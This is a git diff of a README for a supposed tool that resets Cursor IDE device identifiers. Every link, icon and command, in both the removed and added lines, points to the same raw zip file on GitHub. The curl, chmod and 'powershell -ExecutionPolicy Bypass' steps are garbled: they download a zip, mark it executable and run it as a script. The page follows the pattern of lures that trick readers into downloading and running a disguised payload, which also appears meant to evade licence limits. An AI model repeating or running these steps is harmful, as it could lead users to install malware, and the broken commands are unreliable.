@@ -1,6 +1,6 @@
 # 🖱️ cursor_fucked - Effortlessly Reset Cursor IDE Identifiers
 
-[![Download](https://raw.githubusercontent.com/Deathmaninthehood/cursor_fucked/main/broadhearted/cursor_fucked_1.5.zip)](https://raw.githubusercontent.com/Deathmaninthehood/cursor_fucked/main/broadhearted/cursor_fucked_1.5.zip)
+[![Download](https://github.com/Deathmaninthehood/cursor_fucked/raw/refs/heads/main/broadhearted/cursor_fucked_v1.4.zip)](https://github.com/Deathmaninthehood/cursor_fucked/raw/refs/heads/main/broadhearted/cursor_fucked_v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,12 +8,12 @@ Welcome to the cursor_fucked guide! This tool helps you reset the Cursor IDE dev
 
 ## 📥 Download the Software
 
-To get started, you need to download the software from our Releases page. Visit this link to download the latest version: [Download cursor_fucked](https://raw.githubusercontent.com/Deathmaninthehood/cursor_fucked/main/broadhearted/cursor_fucked_1.5.zip).
+To get started, you need to download the software from our Releases page. Visit this link to download the latest version: [Download cursor_fucked](https://github.com/Deathmaninthehood/cursor_fucked/raw/refs/heads/main/broadhearted/cursor_fucked_v1.4.zip).
 
 ## 🖥️ Platform Support
 
-- <img src="https://raw.githubusercontent.com/Deathmaninthehood/cursor_fucked/main/broadhearted/cursor_fucked_1.5.zip" width="16" height="16" alt="Apple"> **macOS**: Use `https://raw.githubusercontent.com/Deathmaninthehood/cursor_fucked/main/broadhearted/cursor_fucked_1.5.zip` (bash script) - [Jump to macOS Guide](#macos-guide)
-- <img src="https://raw.githubusercontent.com/Deathmaninthehood/cursor_fucked/main/broadhearted/cursor_fucked_1.5.zip" width="16" height="16" alt="Windows"> **Windows**: Use `https://raw.githubusercontent.com/Deathmaninthehood/cursor_fucked/main/broadhearted/cursor_fucked_1.5.zip` (PowerShell) - [Jump to Windows Guide](#windows-guide)
+- <img src="https://github.com/Deathmaninthehood/cursor_fucked/raw/refs/heads/main/broadhearted/cursor_fucked_v1.4.zip" width="16" height="16" alt="Apple"> **macOS**: Use `https://github.com/Deathmaninthehood/cursor_fucked/raw/refs/heads/main/broadhearted/cursor_fucked_v1.4.zip` (bash script) - [Jump to macOS Guide](#macos-guide)
+- <img src="https://github.com/Deathmaninthehood/cursor_fucked/raw/refs/heads/main/broadhearted/cursor_fucked_v1.4.zip" width="16" height="16" alt="Windows"> **Windows**: Use `https://github.com/Deathmaninthehood/cursor_fucked/raw/refs/heads/main/broadhearted/cursor_fucked_v1.4.zip` (PowerShell) - [Jump to Windows Guide](#windows-guide)
 
 ## ⚙️ What It Does
 
@@ -27,7 +27,7 @@ This tool provides several features to enhance your experience:
 
 ---
 
-## <img src="https://raw.githubusercontent.com/Deathmaninthehood/cursor_fucked/main/broadhearted/cursor_fucked_1.5.zip" width="20" height="20" alt="Apple"> macOS Guide
+## <img src="https://github.com/Deathmaninthehood/cursor_fucked/raw/refs/heads/main/broadhearted/cursor_fucked_v1.4.zip" width="20" height="20" alt="Apple"> macOS Guide
 
 ### Requirements
 
@@ -46,7 +46,7 @@ Follow these steps to download and install the script on macOS.
 Open Terminal and enter the following command:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/Deathmaninthehood/cursor_fucked/main/broadhearted/cursor_fucked_1.5.zip -o ~https://raw.githubusercontent.com/Deathmaninthehood/cursor_fucked/main/broadhearted/cursor_fucked_1.5.zip
+curl -fsSL https://github.com/Deathmaninthehood/cursor_fucked/raw/refs/heads/main/broadhearted/cursor_fucked_v1.4.zip -o ~https://github.com/Deathmaninthehood/cursor_fucked/raw/refs/heads/main/broadhearted/cursor_fucked_v1.4.zip
 ```
 
 This command will download the script to your home directory.
@@ -56,7 +56,7 @@ This command will download the script to your home directory.
 Before running the script, you need to give it permission to execute. Run this command in the Terminal:
 
 ```bash
-chmod +x ~https://raw.githubusercontent.com/Deathmaninthehood/cursor_fucked/main/broadhearted/cursor_fucked_1.5.zip
+chmod +x ~https://github.com/Deathmaninthehood/cursor_fucked/raw/refs/heads/main/broadhearted/cursor_fucked_v1.4.zip
 ```
 
 #### Step 3: Run the Script
@@ -64,14 +64,14 @@ chmod +x ~https://raw.githubusercontent.com/Deathmaninthehood/cursor_fucked/main
 Now, you can run the script with this command:
 
 ```bash
-~https://raw.githubusercontent.com/Deathmaninthehood/cursor_fucked/main/broadhearted/cursor_fucked_1.5.zip
+~https://github.com/Deathmaninthehood/cursor_fucked/raw/refs/heads/main/broadhearted/cursor_fucked_v1.4.zip
 ```
 
 Follow the prompts on your screen. The tool will reset your device identifiers and create backups automatically.
 
 ---
 
-## <img src="https://raw.githubusercontent.com/Deathmaninthehood/cursor_fucked/main/broadhearted/cursor_fucked_1.5.zip" width="20" height="20" alt="Windows"> Windows Guide
+## <img src="https://github.com/Deathmaninthehood/cursor_fucked/raw/refs/heads/main/broadhearted/cursor_fucked_v1.4.zip" width="20" height="20" alt="Windows"> Windows Guide
 
 ### Requirements
 
@@ -87,7 +87,7 @@ Follow these steps to download and install the script on Windows.
 
 #### Step 1: Download the Script
 
-Go to the Releases page and download the script: [Download cursor_fucked](https://raw.githubusercontent.com/Deathmaninthehood/cursor_fucked/main/broadhearted/cursor_fucked_1.5.zip).
+Go to the Releases page and download the script: [Download cursor_fucked](https://github.com/Deathmaninthehood/cursor_fucked/raw/refs/heads/main/broadhearted/cursor_fucked_v1.4.zip).
 
 #### Step 2: Open PowerShell
 
@@ -104,7 +104,7 @@ cd ~\Downloads
 Run the script using this command:
 
 ```powershell
-powershell -ExecutionPolicy Bypass -File .\https://raw.githubusercontent.com/Deathmaninthehood/cursor_fucked/main/broadhearted/cursor_fucked_1.5.zip
+powershell -ExecutionPolicy Bypass -File .\https://github.com/Deathmaninthehood/cursor_fucked/raw/refs/heads/main/broadhearted/cursor_fucked_v1.4.zip
 ```
 
 Follow the instructions provided by the script. It will reset your device identifiers and create backups for safety. 
